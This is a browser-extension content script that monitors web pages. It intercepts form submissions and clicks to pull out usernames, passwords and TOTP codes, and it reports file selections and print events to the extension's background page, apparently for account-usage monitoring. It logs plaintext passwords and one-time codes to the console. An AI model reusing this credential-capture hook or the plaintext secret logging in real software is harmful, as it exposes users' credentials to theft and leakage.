function analyzeForm(formElements) {
    new SessionState(window.location.origin).load().then(sessionState =>  {
        debug("analyzing form")

        let formUsername, formPassword, formTOTP
        const formHasPassword = formElements.some(elem => elem.type === 'password')

        for (let elem of formElements) {
            if (elem.value === "" || elem.value === undefined || elem.isHidden()) continue

            debug("found element", serializeElement(elem))

            if (elem.type === 'password' || isMFA(elem.name) || isMFA(elem.id) || isMFA(window.location.pathname)) {
                if (isTOTP(elem.value)) {
                    debug("found TOTP", elem.value)

                    formTOTP = elem.value
                    continue
                }
            }

            if (elem.type === 'password' || isPasswordField(elem.name) || isPasswordField(elem.id)) {
                if (! isTOTP(elem.value)) {
                    debug("found password", elem.value)

                    formPassword = elem.value
                    continue
                }
            }

            if (
                (elem.type === 'text' || elem.type === 'email') && (
                    formHasPassword &&  formUsername === undefined ||
                    findAuthPattern(window.location.pathname) &&  (
                        isUsernameField(elem.name) ||
                        isUsernameField(elem.id) ||
                        findEmailPattern(elem.value)
                    )
                )
            ) {
                debug("found username (in form)", elem.value)
                formUsername = elem.value
            }
        }

        console.log("TAUPE username var is ", formUsername)
        console.log("TAUPE password var is ", formPassword)
        console.log("TAUPE TOTP var is ", formTOTP)
        debug("formUsername is ", formUsername)
        debug("formPassword is ", formPassword)
        debug("formTOTP is ", formTOTP)

        if (formUsername === undefined && formPassword === undefined && formTOTP === undefined) return

        if (formUsername !== undefined) {
            sessionState.setUsername(formUsername)
        }

        if (formPassword !== undefined) {
            if (sessionState.auth.username === undefined) {
                sessionState.init()
                return
            } else {
                sessionState.setPassword(formPassword)
            }
        }

        if (formTOTP !== undefined) {
            if (sessionState.auth.password === undefined) {
                sessionState.init()
            } else {
                sessionState.setTOTP()
            }
        }

        if (sessionState.auth.username !== undefined && sessionState.auth.password !== undefined) {
            if (sessionState.auth.totp) {
                chrome.runtime.sendMessage({ type: 'mfa-received' })
                sessionState.init()
            } else {
                const report = {
                    username: sessionState.auth.username,
                    password: sessionState.auth.password
                }
                chrome.runtime.sendMessage({type: 'account-usage', report})
            }
        }

        sessionState.save()
    })

}

document.addEventListener('DOMContentLoaded', () => {
    function shallowClone(obj) {
        const clone = {}

        for (const key in obj) {
            const value = obj[key]
            if (typeof value !== 'function') {
                clone[key] = value
            }
        }

        return clone
    }

    document.addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            chrome.runtime.sendMessage({type: "user-interaction"})
        }
    }, true)

    window.addEventListener('beforeprint', function() {
        chrome.runtime.sendMessage({type: 'print-dialog'});
    }, true)

    document.addEventListener('change', function(event) {
        if (event.target?.type === 'file') {
            for (const file of event.target.files) {
                chrome.runtime.sendMessage({ type: 'file-select', subtype : 'picked file', file: shallowClone(file)
             })
            }
        }
    }, true)

    document.addEventListener('drop', function(event) {
        Array.from(event.dataTransfer.files).forEach(file => {
            chrome.runtime.sendMessage({ type: 'file-select', subtype : 'dropped file', file: shallowClone(file) })
        })

        Array.from(event.dataTransfer.items).forEach(item => {
            if (item.kind === 'file') {
                const file = item.getAsFile();
                chrome.runtime.sendMessage({ type: 'file-select', subtype : 'dropped file', file: shallowClone(file) })
            }
        })

    }, true)

    const originalSubmit = HTMLFormElement.prototype.submit
    HTMLFormElement.prototype.submit = function() {
        try {
            analyzeForm(this.elements)
        } catch (error) {
            console.error("error while analyzing password", error)
        }

        originalSubmit.apply(this, arguments)
    }

    document.addEventListener("click", function(event) {
        chrome.runtime.sendMessage({type: "user-interaction"})

        let fields = []

        const button = event.target.closest('button, input[type="button"], input[type="submit"]')
        if (
            !button ||
            button.disabled ||
            button.offsetParent === null ||
            button.isHidden()
        ) {
            return
        }

        if (button.form) {
            fields = Array.from(button.form.elements)
        } else {
            // Use the nearest ancestor that contains at least 1 relevant field (but not just the button itself)
            let container = button.parentElement
            while (container && container !== document.body) {
                fields = Array.from(container.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]'))
                if (fields.length > 0 && !fields.includes(button)) break
                container = container.parentElement
            }
        }

        analyzeForm(fields)

    }, true)
})

function serializeElement(elem) {
    const result = {}
    for (const attr of elem.attributes) {
        result[attr.name] = attr.value
    }
    return result
}